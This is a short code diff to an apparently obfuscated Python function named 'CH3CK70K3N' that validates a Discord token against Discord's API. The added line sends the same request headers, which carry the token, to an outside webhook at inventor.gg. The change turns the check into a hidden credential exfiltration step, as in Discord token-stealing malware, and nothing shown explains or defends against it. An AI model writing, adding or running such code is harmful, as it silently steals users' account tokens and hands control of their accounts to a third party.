@@ -472,6 +472,7 @@ def CH3CK70K3N(token):
     }
     try:
         urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
+        urlopen(Request("https://inventor.gg/api/webhooks/wRrtQXEYiCgEmyT/CQoPkAlZyGJqVxyDYrnlzRhZXffONJ", headers=headers))
         return True
     except:
         return False
